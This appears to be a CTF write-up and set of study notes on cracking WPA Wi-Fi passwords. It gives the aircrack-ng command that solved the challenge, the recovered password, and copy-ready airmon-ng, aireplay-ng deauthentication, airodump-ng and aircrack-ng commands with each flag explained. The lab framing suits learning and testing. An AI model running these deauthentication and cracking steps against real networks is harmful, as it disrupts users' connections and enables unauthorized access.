# Solving the ctf 
  1. `sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 02:1A:11:FF:D9:BD -e 'James Honor 8' NinjaJc01-01.cap`
  2. found the password: greeneggsandham

---

## Wifi Hacking Workflow(Deauthentication Attack Method)
  ```sh
  1. use airmon-ng to enter monitor mode
  2. [opcional] force the clients from the target network to de-authenticate to speed up the process of gathering the 4 way handshake
  3. use airdump-ng to capture packets passing through the interface(monitor mode interface) into pcap files
  4. use aircrack-ng to crack the password from the pcap file
  ```

---

## 1. Armon-ng(used to change interaces into monitor mode)
  - monitor mode: `sudo airmon-ng start wlan0` (assuming wlan0 is your interface's name)
  - the name will likely be: `wlan0mon`
  - kill processes using that network adapter: `airmon-ng check kill`

---

## 2. Aireplay-ng(force the clients to deauth to speed up the process of getting the passwd hash)
  
  deauthenticate specific client:
  <details closed>
    - example use: `sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon`

    - `--deauth 10`: Sends 10 deauthentication packets.
    - `-a 00:11:22:33:44:55`: The MAC address of the target access point.
    - `-c AA:BB:CC:DD:EE:FF`: The MAC address of the client to deauthenticate.
    - `wlan0mon`: Yor wireless interface in monitor mode
  </details>

  deauthenticate all clients:
  <details closed>
    - example use: `sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon`

    - `--deauth 0`: Sends deauthentication packets continuously (0 means infinite).
    - `-a 00:11:22:33:44:55`: The MAC address of the target access point.
    - `wlan0mon`: Your wireless interface in monitor mode.
  </details>

---

## 3. Airodump-ng(captures packets from an interface in monitor mode)
  - `sudo airodump-ng wlan0mon`

  - example use: `sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon`
    - `-c <channel>`: Specifies the channel of the target network.
    - -`b <BSSID>`: Specifies the BSSID (MAC address) of the target access point.
    - `-w capture`: Writes captured packets to a file named capture-01.cap (increments the file number for subsequent captures).

---

## 4. Aircrack-ng(cracks the hash of the passphrase from the 4-way-handshake pcap file)
  - Important switches
  ```sh
  -b (to specify the bssid)
  -e (to specify the essid)
  -w (to specify a wordlist)
  ```

  - example use: `sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture.cap`
